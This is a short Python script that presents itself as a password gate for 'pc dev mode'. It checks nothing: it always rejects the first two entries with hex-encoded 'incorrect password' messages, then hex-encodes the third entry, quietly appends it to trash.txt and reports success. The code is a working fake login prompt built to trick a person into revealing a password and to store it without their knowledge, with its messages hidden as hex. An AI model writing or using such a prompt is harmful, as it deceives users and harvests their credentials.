print("Here you can enter your pc dev mode by entering correct password")


def conv():
    a = "796f75722070617373776f726420697320696e636f7272656374"
    b = "506c656173652054727920616761696e20416e6420656e74657220636f72726563742070617373776f726420746869732074696d65"
    hex_st = a
    hex_stb = b
    conv1 = bytes.fromhex(a).decode('utf-8')
    cov2 = bytes.fromhex(b).decode('utf-8')
    print(conv1)
    pas1 = input("Enter password: ")
    print(conv1)
    pas1 = input("Enter password: ")
    print(cov2)
    pas2 = input("Enter password: ")
    h = pas2
    d = h.encode('utf-8').hex()
    with open("trash.txt", 'a') as f:
        f.write(d)
    print("You entered password correctly")


input("Enter password: ")
conv()
